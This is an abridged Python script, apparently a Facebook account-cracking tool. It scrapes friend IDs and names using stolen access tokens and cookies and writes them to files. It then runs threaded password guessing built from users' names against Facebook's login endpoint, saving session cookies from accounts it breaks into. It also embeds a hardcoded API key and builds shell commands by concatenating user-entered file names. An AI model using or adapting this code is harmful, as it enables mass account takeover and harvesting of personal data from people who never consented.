...
from concurrent.futures import ThreadPoolExecutor as BISHALBISHAL
from string import * 
...
\033[1;37m
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Muhammad Bishal
\033[1;37m Facebook:            Muhammad Bishal
\033[1;37m Github  :            Bishal-Bishal
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back BISHAL Menu ")
        exit()
...
def BISHAL():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/+8801797394520')
        pass
    elif select =='F':
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                ...
                q = session.post("https://mbesic.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BISHALb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BISHALb};{ckkk}"
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with BISHALBISHAL(max_workers=30) as BISHALworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/BISHAL.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/Bishal.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    BISHAL = input('Put File Name :')
    print(" ")
    BISHAL = input('Saving Put File Name :')
    os.system('touch ' +BISHAL)
    os.system('sort -r '+BISHAL+' | uniq > '+BISHAL)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + BISHAL )
    print(47*'-')
    print("File Saved To :" + BISHAL )
    print(47*'-')
    input(f"{S} Press Enter To Back BISHAL Menu ")
    menu
        ...
        while True:
            try:
                ...
                if 'B' in fbuid.upper():
                    menu()
                    break
                dmp = requests.get("https://mbesic.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    open(file,'a').write(idnm['id']+"|"+idnm['name']+'\n')
                    totaldmp+=1
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/BISHAL.txt\n') 
        filepath = input("Put File Name: ")
